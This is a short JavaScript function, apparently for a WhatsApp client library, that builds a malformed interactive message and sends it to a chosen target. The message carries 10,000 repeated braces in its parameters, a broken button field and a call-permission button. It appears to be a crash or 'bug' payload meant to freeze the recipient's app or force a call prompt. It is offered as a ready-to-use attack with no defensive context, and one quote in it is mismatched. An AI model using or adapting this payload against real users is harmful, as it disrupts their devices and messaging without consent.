async function ForceCall(target) {
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "⩟⬦𪲁 𝐑͜͢𝐈𝐙͠𝐗𝐕͠𝐄𝐋𝐙̸̷̷̷͡𝐗͜͢𝐒 - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: "{“,
},
{
name: "call_permission_request",
buttonParamsJson: "",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}